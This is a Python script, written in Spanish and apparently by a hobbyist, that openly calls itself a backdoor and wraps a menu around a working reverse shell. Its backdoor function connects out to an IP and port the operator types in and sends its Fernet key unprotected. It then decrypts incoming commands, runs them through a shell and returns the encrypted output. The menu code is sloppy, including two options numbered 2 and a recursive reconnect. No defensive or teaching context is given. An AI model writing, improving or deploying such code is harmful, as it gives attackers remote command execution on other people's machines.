import multiprocessing
import socket
import subprocess
import os
from cryptography.fernet import Fernet
import sys

clave = Fernet.generate_key()
cipher_suite = Fernet(clave)

def backdoor():
    ip = input("Introduce la dirección IP: ")
    puerto = int(input("Introduce el puerto: "))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, puerto))

    s.send(clave)

    while True:
        comando_encriptado = s.recv(1024)
        comando = cipher_suite.decrypt(comando_encriptado).decode()

        if comando.lower() == "salir":
            s.close()
            backdoor()
            break
        else:
            proceso = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            resultado = proceso.stdout.read() + proceso.stderr.read()
            resultado_encriptado = cipher_suite.encrypt(resultado)
            s.send(resultado_encriptado)

def abrir_backdoor():
    if os.path.exists("config.txt"):
        print("La backdoor ya está abierta.")
    else:
        with open("config.txt", "w") as f:
            f.write("abierta")
        print("Backdoor abierta.")

def cerrar_backdoor():
    if os.path.exists("config.txt"):
        os.remove("config.txt")
        print("Backdoor cerrada.")
    else:
        print("La backdoor ya está cerrada.")

def banner():
    cartel = r"""
     ___          _      _              
    | _ ) __ _ __| |____| |___  ___ _ _ 
    | _ \/ _` / _| / / _` / _ \/ _ \ '_|
    |___/\__,_\__|_\_\__,_\___/\___/_|  
                                     
    """
    print(cartel)

if __name__ == '__main__':
    try:
        multiprocessing.set_start_method('spawn')
        p = multiprocessing.Process(target=backdoor)
        p.start()

        while True:

            banner()

            print("*******************************")
            print("*            MENU             *")
            print("*******************************")
            print("*     1. ABRIR BACKDOOR       *")
            print("*                             *")
            print("*     2. ACCEDER A BACKDOOR   *")
            print("*                             *")
            print("*     2. CERRAR BACKDOOR      *")
            print("*******************************")
            
            opcion = input("Seleccione el tipo de conexión (1, 2 o 3): ").strip()
            
            if opcion == "1":
                abrir_backdoor()
                break
            elif opcion == "2":
                if os.path.exists("config.txt"):
                    backdoor()
                else:
                    print("La backdoor no está abierta.")
            elif opcion == "3":
                cerrar_backdoor()
                break
            else:
                print("Opción inválida. Intenta de nuevo.")

        p.join()
    except OSError as e:
        print(f"Error al crear el demonio: {e}")
        sys.exit(1)